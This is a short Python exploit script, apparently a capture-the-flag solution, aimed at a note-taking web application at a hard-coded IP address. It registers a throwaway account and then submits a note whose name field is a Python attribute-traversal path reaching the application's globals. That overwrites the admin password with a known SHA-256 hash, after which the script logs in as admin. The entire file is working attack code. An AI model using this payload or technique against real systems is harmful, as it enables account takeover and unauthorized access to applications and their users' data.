import requests
import random
import re
import hashlib

class exploit:
	def __init__(self,url,session):
		self.url = url
		self.sess = session

	def login(self,user,pwd):
		r = self.sess.post('%s/login'%(self.url),data={"username":user,"password":pwd})
		return 'Error while login user' not in r.text

	def register(self):
		self.user = ''.join([random.choice('abcdef') for _ in range(15)])
		self.pwd = self.user
		r = self.sess.post('%s/register'%(self.url),data={"username":self.user,"password":self.pwd})
		return 'Logout' in r.text

	def create_note(self,name,value):
		r = self.sess.post('%s/create'%(self.url),data={"name":name,"content":value})
		return r.text
		return re.findall(r'<a href="articles/(.*?)</a>',r.text)

	def view_note(self,note):
		return self.sess.get('%s/articles/%s'%(self.url,note)).text

exp = exploit(
	url='http://13.37.17.31:54333',
	session=requests.session()
)
exp.register()
exp.login(exp.user,exp.pwd)
exp.create_note(
	name  = '__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.users.admin.password',
	value = hashlib.sha256(b'ngocdaica').hexdigest()
)
r = exp.login('admin','ngocdaica')